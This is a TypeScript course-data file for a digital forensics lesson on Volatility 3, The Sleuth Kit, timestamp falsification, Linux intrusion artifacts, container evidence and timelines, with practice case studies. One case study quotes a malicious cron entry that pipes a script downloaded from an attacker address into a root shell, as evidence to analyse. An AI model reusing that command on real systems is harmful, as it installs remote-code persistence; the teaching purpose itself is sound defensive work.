import type { CourseBody } from '../../types';
import { questions } from './questions.en';

export const body: CourseBody = {
  courseId: 'j-memoire-artefacts-linux',
  lesson: {
    intro:
      'Once the evidence is preserved and acquired, it has to be made to speak. RAM shows what was running at acquisition time, including what never touched the disk; the disk keeps the history of files, even deleted ones; logs and the network give the thread of time. This course presents the reference tools of this analysis (Volatility 3, The Sleuth Kit, Autopsy, FTK Imager) and the artifacts specific to Linux servers, then shows how to bring everything together in a timeline.',
    sections: [
      {
        id: 'memoire',
        title: 'Memory analysis with Volatility 3',
        blocks: [
          { t: 'p', text: '**Volatility 3** rebuilds kernel structures from a raw memory image: processes, connections, loaded modules, command lines. It relies on **symbol tables** specific to the exact version of the analyzed system (provided for Windows, to be generated for a Linux kernel).' },
          { t: 'code', lang: 'bash', caption: 'First plugins on a Windows image', code: '# Processes as listed by the kernel (linked list)\nvol -f poste12.raw windows.pslist\n\n# Search for process structures across all memory\nvol -f poste12.raw windows.psscan\n\n# Tree, command lines, network connections\nvol -f poste12.raw windows.pstree\nvol -f poste12.raw windows.cmdline\nvol -f poste12.raw windows.netscan\n\n# Executable memory areas with no associated file (injected code)\nvol -f poste12.raw windows.malfind' },
          {
            t: 'example',
            title: 'A process present in psscan but absent from pslist',
            blocks: [
              { t: 'p', text: '`pslist` walks the linked list of processes maintained by the kernel; `psscan` looks for process structures across all memory. A process visible to `psscan` and absent from `pslist` is either **terminated** (its structure remains in memory), or **unlinked** from the list by a rootkit to hide. End timestamps and the associated connections (`netscan`) allow deciding.' },
            ],
          },
          { t: 'def', term: 'Code injection', text: 'Technique that writes code into the memory space of another process, often a legitimate one, then runs it. `malfind` flags regions that are both executable and not backed by a file on disk, often with a visible executable header.' },
          { t: 'callout', kind: 'warn', text: 'Volatility outputs are **clues** to cross-check: a region flagged by `malfind` may be legitimate (just-in-time compilation of .NET or JavaScript). We extract the area, compute its hash and analyze it before concluding.' },
        ],
      },
      {
        id: 'disque',
        title: 'Disk image: The Sleuth Kit, Autopsy, FTK Imager',
        blocks: [
          { t: 'p', text: 'Analysis is **always done on a copy** verified by hash. **FTK Imager** is used to acquire (raw or E01 formats), verify hashes and mount an image read-only. **The Sleuth Kit** provides commands that directly read file-system structures; **Autopsy** is its graphical interface, with keyword search, gallery and timeline.' },
          { t: 'code', lang: 'bash', caption: 'Typical walkthrough with The Sleuth Kit', code: '# 1. Partition table (find the starting offset, in sectors)\nmmls serveur.dd\n\n# 2. File-system information for the partition starting at sector 2048\nfsstat -o 2048 serveur.dd\n\n# 3. Recursive file listing; deleted entries are marked "*"\nfls -r -o 2048 serveur.dd\n\n# 4. Metadata then content of a file by its inode number\nistat -o 2048 serveur.dd 131090\nicat -o 2048 serveur.dd 131090 > extrait.bin' },
          { t: 'def', term: 'Inode', text: 'Structure that describes a file on Unix-type systems (ext4): owner, permissions, timestamps, location of the data. The file name is stored separately, in the directory. On NTFS, the equivalent role is played by the **MFT** entry.' },
          { t: 'callout', kind: 'info', text: 'A deleted file is often merely “unlinked”: its entry is marked free, but its metadata and data remain on the disk until reused. `fls` and `icat` can then recover them.' },
        ],
      },
      {
        id: 'horodatages',
        title: 'Timestamps: NTFS, ext4 and falsification',
        blocks: [
          {
            t: 'table',
            head: ['System', 'Timestamps', 'Useful particularity'],
            rows: [
              ['**NTFS**', 'Creation, modification, access, MFT entry modification — stored **twice**: in `$STANDARD_INFORMATION` and in `$FILE_NAME`', '`$STANDARD_INFORMATION` can be modified with a simple API; `$FILE_NAME` is much harder to change'],
              ['**ext4**', '`atime` (access), `mtime` (content), `ctime` (metadata change), `crtime` (creation)', '`touch` can modify `atime` and `mtime`, but sets `ctime` to the current time'],
            ],
          },
          { t: 'def', term: 'Timestamp falsification (timestomping)', text: 'Deliberate modification of a file’s dates to make it look old and bury it among system files (MITRE ATT&CK T1070.006). Signs: on NTFS, a `$STANDARD_INFORMATION` creation date earlier than that of `$FILE_NAME`, or fractions of a second at zero; on ext4, a `ctime` much later than `mtime`.' },
          { t: 'callout', kind: 'warn', text: 'The access date is unreliable: under Linux, the `relatime` mount option updates it only in some cases, and Windows may not update it. We never base a conclusion on an access alone.' },
        ],
      },
      {
        id: 'linux',
        title: 'Artifacts of an intrusion on a Linux server',
        blocks: [
          {
            t: 'table',
            head: ['Question', 'Where to look'],
            rows: [
              ['Who signed in, from where?', '`/var/log/auth.log` (Debian, Ubuntu) or `/var/log/secure` (RHEL); `wtmp` (`last -f`), `btmp` (failures, `lastb -f`); systemd journal'],
              ['Which commands?', '`~/.bash_history` of each account (including root); auditd logs if any'],
              ['How does the attacker return?', 'Crontabs (`/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`), systemd units (`/etc/systemd/system/`, `~/.config/systemd/user/`), `~/.ssh/authorized_keys`, shell initialization files, `/etc/ld.so.preload`'],
              ['What did they drop?', '`/tmp`, `/var/tmp`, `/dev/shm`, hidden files (starting with a dot), modified system binaries (`debsums`, `rpm -Va`)'],
            ],
          },
          { t: 'code', lang: 'bash', caption: 'Reading the logs of an image mounted read-only', code: '# systemd journal of the image (not that of the analysis workstation)\njournalctl -D /mnt/image/var/log/journal --since "2026-10-02" -u ssh\n\n# Sign-ins recorded in the image’s wtmp\nlast -f /mnt/image/var/log/wtmp' },
          { t: 'callout', kind: 'key', text: 'The absence of a trace is also information: an empty `.bash_history` or one linked to `/dev/null`, a truncated `wtmp` or a gap in the log are clues of deliberate erasure, to be dated and recorded.' },
        ],
      },
      {
        id: 'chronologie',
        title: 'Building a multi-source timeline',
        blocks: [
          { t: 'p', text: 'The timeline is the central deliverable of an investigation: it orders the events from all sources to reconstruct what happened and in what order.' },
          { t: 'code', lang: 'bash', caption: 'File-system timeline with The Sleuth Kit', code: '# Extract the metadata of all files in "body" format\nfls -r -m / -o 2048 serveur.dd > body.txt\n\n# Sort by date, in CSV format, over the incident window\nmactime -b body.txt -d 2026-10-01..2026-10-05 > chronologie.csv' },
          { t: 'list', items: ['**Normalize time zones**: convert everything to UTC and note each source’s time zone.', '**Check clock drift**: an unsynchronized server shifts its whole timeline.', 'Merge disk, system logs, application logs, firewall and network (Zeek, captures); “super-timeline” tools such as plaso (log2timeline) automate this merging.', 'Start from a reliable **anchor point** (alert, known sign-in) and explore before and after.'] },
          { t: 'def', term: 'Anchor point', text: 'An event dated with certainty, from which the search is oriented. For example: the first successful SSH sign-in from the attacker’s address, attested both by `auth.log` and by the firewall.' },
        ],
      },
      {
        id: 'conteneurs',
        title: 'Containers, Kubernetes and virtual machines in the cloud',
        blocks: [
          { t: 'p', text: 'Modern servers often run **containers** or live in the **cloud**. The principles of forensics remain the same (preserve, verify, date, cross-check), but traces are more ephemeral: a deleted container takes with it its layers and, by default, its logs.' },
          {
            t: 'table',
            head: ['Environment', 'Where the traces are', 'Precaution'],
            rows: [
              ['**Docker host**', '`/var/lib/docker` (images, overlay2 layers, volumes, JSON logs of each container); `docker inspect` (mounts, privileges, variables)', 'Capture the state of a running container **before** stopping or deleting it'],
              ['**Kubernetes**', 'API audit log (who did what), pod logs, cluster events, node logs', 'Enable audit and export the logs outside the cluster'],
              ['**Cloud virtual machine**', 'Volume snapshot, platform logs (account activity, API calls), network flow logs', 'Isolate through network rules and take a snapshot rather than delete the instance'],
              ['**Managed services**', 'Provider audit logs, storage-object access logs', 'Check the retention offered by the provider and the shared-responsibility model'],
            ],
          },
          { t: 'code', lang: 'bash', caption: 'Preserving the state of a suspect container before intervening', code: '# Full configuration: mounts, privileges, network, variables\ndocker inspect conteneur-web > inspect.json\n\n# Container logs\ndocker logs --timestamps conteneur-web > logs.txt\n\n# Running processes in the container\ndocker top conteneur-web > top.txt\n\n# Copy of the container file system\ndocker export conteneur-web -o conteneur-web.tar\n\n# Hashes of all collected items\nsha256sum inspect.json logs.txt top.txt conteneur-web.tar > empreintes.txt' },
          { t: 'list', items: ['**Privileges**: a “privileged” container or one that mounts the engine socket gives near-complete access to the host: this is a point to check first.', '**Ephemeral**: containers are recreated by the orchestrator; without external logging, traces are erased.', '**Cloud account**: platform activity logs show resource creations and rights changes.'] },
          { t: 'callout', kind: 'key', text: 'In the cloud and with containers, log retention is decided **before** the incident: a log that was not kept cannot be recovered.' },
        ],
      },
      {
        id: 'integrite',
        title: 'Linux system integrity and detecting changes',
        blocks: [
          { t: 'p', text: 'An attacker who takes control of a Linux server rarely modifies the system at random: they replace a binary, add an account, load a library, install a task. Comparing the system with a **reference state** reveals these changes.' },
          {
            t: 'table',
            head: ['Check', 'Command or location', 'What it reveals'],
            rows: [
              ['Package integrity', '`debsums -c` (Debian, Ubuntu), `rpm -Va` (Red Hat)', 'System binary or library modified or replaced'],
              ['Recent files', '`find / -xdev -newermt "2026-10-02" ! -newermt "2026-10-04"`', 'Files modified during the incident window'],
              ['Special rights', '`find / -perm -4000 -type f` (SUID)', 'SUID executable added, notably in a temporary directory'],
              ['Accounts', '`/etc/passwd`, `/etc/shadow`, `/etc/sudoers.d/`', 'Added account, extra UID 0, granted sudo rights'],
              ['Forced loading', '`/etc/ld.so.preload`', 'Library injected into all processes (rootkit technique)'],
              ['Kernel modules', '`lsmod`, `/lib/modules/`', 'Unknown or unsigned module'],
            ],
          },
          { t: 'def', term: 'Integrity baseline', text: 'Snapshot of the hashes and attributes of the files of a healthy system (for example with AIDE), regularly compared with the current state. Any unexplained difference is a clue. It must be stored off the server so an attacker cannot modify it.' },
          { t: 'list', items: ['**Extract, do not execute**: we copy the suspect file from the read-only mounted image and analyze it in an isolated environment.', '**Compare with the source**: we download the official package of the same version and compare hashes.', '**Date**: `ctime` and `crtime` give the real date of the change, unlike `mtime`, which can be reset to an old date.', '**Search in cascade**: a modified binary leads to the library that loads it, then to the task that launches it.'] },
          { t: 'callout', kind: 'warn', text: 'An integrity difference is not always malicious (configuration file modified by the administrator, update). It is qualified by context and date, never by the hash difference alone.' },
        ],
      },
    ],
    useCases: [
      'Investigation of a compromised Linux web server: entry point, commands executed, persistence, data touched.',
      'Hunting fileless malware on a Windows workstation from a memory image.',
      'Judicial expertise: documented and reproducible timeline, each conclusion tied to an artifact and its hash.',
    ],
    commonMistakes: [
      'Mounting an image read-write or analyzing the original instead of the copy.',
      'Reading the analysis workstation’s logs instead of the image’s (forgetting `-D` or `-f`).',
      'Mixing local times and UTC in the timeline.',
      'Concluding to a compromise from a single `malfind` output, with no cross-check.',
      'Relying on a file’s access date or on `$STANDARD_INFORMATION` timestamps without comparing them to `$FILE_NAME`.',
    ],
    bestPractices: [
      'Work on a copy verified by hash, mounted read-only.',
      'Record every command, tool version and result (reproducibility).',
      'Cross-check each conclusion with at least two independent sources.',
      'Convert all sources to UTC and measure clock drift.',
      'Systematically look for persistence mechanisms before declaring a system clean.',
    ],
    keyPoints: [
      '`pslist` follows the kernel list, `psscan` searches all memory: a gap signals a terminated or hidden process.',
      'The Sleuth Kit: `mmls`, `fls`, `istat`, `icat`, `mactime`; Autopsy is its graphical interface.',
      'NTFS stores dates twice; a gap between `$SI` and `$FN` betrays falsification.',
      'Linux: auth.log or secure, wtmp, bash_history, cron, systemd, authorized_keys.',
      'A reliable timeline is in UTC, multi-source and anchored on a certain event.',
    ],
  },
  practice: [
    {
      id: 'memoire-poste',
      kind: 'analysis',
      title: 'Interpreting Volatility outputs',
      context: [
        { t: 'p', text: 'Excerpts from a Windows workstation memory image:' },
        { t: 'code', lang: 'text', code: 'windows.pslist (excerpt)\nPID   PPID  Name             Created\n4120  3988  explorer.exe     2026-10-02 07:58:12\n6604  4120  OUTLOOK.EXE      2026-10-02 08:01:40\n\nwindows.psscan (excerpt, in addition to the above)\n7216  6604  rundll32.exe     2026-10-02 09:12:03   (absent from pslist, no end time)\n\nwindows.netscan\n7216  rundll32.exe  10.1.4.31:50412 → 198.51.100.23:443  ESTABLISHED\n\nwindows.malfind\n7216  rundll32.exe  region 0x2a10000  PAGE_EXECUTE_READWRITE  "MZ" header' },
      ],
      steps: ['Interpret each observation.', 'Formulate a prudent conclusion and what would strengthen it.', 'Indicate the extractions to carry out for the rest of the analysis.'],
    },
    {
      id: 'serveur-linux',
      kind: 'case',
      title: 'Case study: timeline of a compromised Linux server',
      context: [
        { t: 'p', text: 'Disk image of an Ubuntu server. Raw observations:' },
        { t: 'code', lang: 'text', code: 'auth.log  : 2026-10-02 22:41:07 Accepted password for deploy from 203.0.113.50\nauth.log  : 2026-10-02 22:40:55 … 22:41:05  1,312 "Failed password for deploy" from 203.0.113.50\nwtmp      : no entry between 22:00 and 23:30\n/home/deploy/.bash_history : symbolic link to /dev/null, ctime 2026-10-02 22:43:10\n/etc/cron.d/sysupdate : created (crtime) 2026-10-02 22:44:31, content: "*/5 * * * * root curl -s http://203.0.113.50/u.sh | sh"\n/usr/lib/x86_64-linux-gnu/libkeyutils.so.9 : mtime 2021-03-14, ctime 2026-10-02 22:45:02' },
      ],
      steps: ['Build the timeline of facts in UTC (the server is on UTC).', 'Identify the entry point, the persistence and the concealment attempts.', 'List the checks and the remediation measures.'],
    },
    {
      id: 'conteneur-compromis',
      kind: 'case',
      title: 'Case study: an exposed container suspected of being compromised',
      context: [
        { t: 'p', text: 'An alert reports unusual outbound connections from the host `docker-prod-02`. Observations:' },
        { t: 'code', lang: 'text', code: 'docker ps : container "web-api" (image registre-interne/web-api:4.2), started 11 days ago\ndocker inspect web-api : Privileged = true ; mount /var/run/docker.sock:/var/run/docker.sock\ndocker logs web-api (excerpt) : "GET /health 200" every 30 s ; 2026-10-02 03:12:08 "POST /upload 200" ; 03:12:41 "GET /uploads/x.php?c=… 200"\ndocker diff web-api : A /var/www/uploads/x.php ; A /tmp/.cache/agent\nHost: new container "agent-sync" created at 03:20:15, unknown image, host network\nCloud audit log: access key of the account "ci-deploy" used at 03:27 from an unknown address' },
      ],
      steps: ['Build the timeline and identify the entry point, the escalation and the persistence.', 'Indicate, in order, what you preserve before any action on the host and the container.', 'Propose the containment, eradication and hardening measures.'],
    },
  ],
  questions,
  resources: [
    { title: 'Volatility 3 documentation', source: 'Volatility Foundation', url: 'https://volatility3.readthedocs.io/' },
    { title: 'The Sleuth Kit', source: 'Brian Carrier / Basis Technology', url: 'https://www.sleuthkit.org/sleuthkit/' },
    { title: 'Autopsy', source: 'Basis Technology', url: 'https://www.autopsy.com/' },
    { title: 'Guide to Integrating Forensic Techniques into Incident Response (SP 800-86)', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/86/final' },
    { title: 'plaso (log2timeline)', source: 'plaso project', url: 'https://plaso.readthedocs.io/' },
  ],
};
